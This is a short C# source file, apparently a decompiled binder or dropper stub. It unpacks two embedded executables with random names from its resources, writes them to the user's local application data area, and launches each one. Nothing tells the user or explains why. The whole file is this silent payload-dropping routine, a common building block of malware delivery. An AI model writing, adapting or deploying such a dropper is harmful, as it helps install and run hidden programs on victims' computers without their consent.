using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;

namespace Bound;

internal static class Open
{
	private static void Main()
	{
		try
		{
			ResourceManager resourceManager = new ResourceManager("files", Assembly.GetExecutingAssembly());
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "PPiXazGYJv.exe", (byte[])resourceManager.GetObject("cWYqBmkanu"));
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "PPiXazGYJv.exe");
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "M_GXZGkpRk.exe", (byte[])resourceManager.GetObject("qOjDdBifap"));
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "M_GXZGkpRk.exe");
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			Console.Read();
		}
	}
}
